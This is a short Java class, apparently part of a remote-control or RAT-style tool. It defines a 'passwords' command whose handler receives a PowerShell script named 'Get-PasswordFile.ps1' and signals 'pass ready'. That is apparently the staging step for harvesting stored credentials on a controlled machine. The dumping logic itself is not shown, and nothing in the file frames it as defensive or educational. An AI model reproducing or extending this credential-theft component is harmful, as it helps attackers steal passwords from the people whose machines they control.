package commands;

import java.io.IOException;

import connection.Controller;

public class PasswordsCommand extends Command{

	public PasswordsCommand() {
		super("passwords");
	}

	@Override
	public void execute(Controller ctrl) throws IOException {
		ctrl.receiveFile("Get-PasswordFile.ps1");
		ctrl.sendMsg("pass ready");
	}

}
